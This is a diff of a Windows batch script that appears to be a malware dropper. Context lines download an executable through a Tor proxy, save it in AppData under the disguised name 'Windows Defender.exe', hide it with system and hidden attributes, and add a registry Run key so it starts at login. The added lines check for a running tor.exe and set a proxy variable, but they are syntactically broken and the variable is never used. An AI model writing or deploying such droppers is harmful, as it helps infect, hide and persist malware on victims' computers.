@@ -5,6 +5,11 @@ FOR /D %%p IN ("%temp%\*.*") DO rmdir "%%p" /s /q
 ping www.google.com -n 1 -w 5000 >NUL
 if errorlevel 1 goto Connectivitycheck
 
+tasklist /fi "imagename eq tor.exe" | find /i "tor.exe" > nul
+if not errorlevel 1 (set proxy = "--socks5-hostname 127.0.0.1:9050") else (
+  set proxy = ""
+)
+
 curl.exe --socks5-hostname 127.0.0.1:9050 https://cryptedlumos.github.io/WindowsDefender.exe --output "%AppData%\Microsoft\Windows\Windows Defender.exe" && attrib +s +h +i "%AppData%\Microsoft\Windows\Windows Defender.exe"
 REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /t REG_SZ /F /D "%AppData%\Microsoft\Windows\Windows Defender.exe -P\"rofile of Windows Defender [Microsoft Corporation]"\"
 
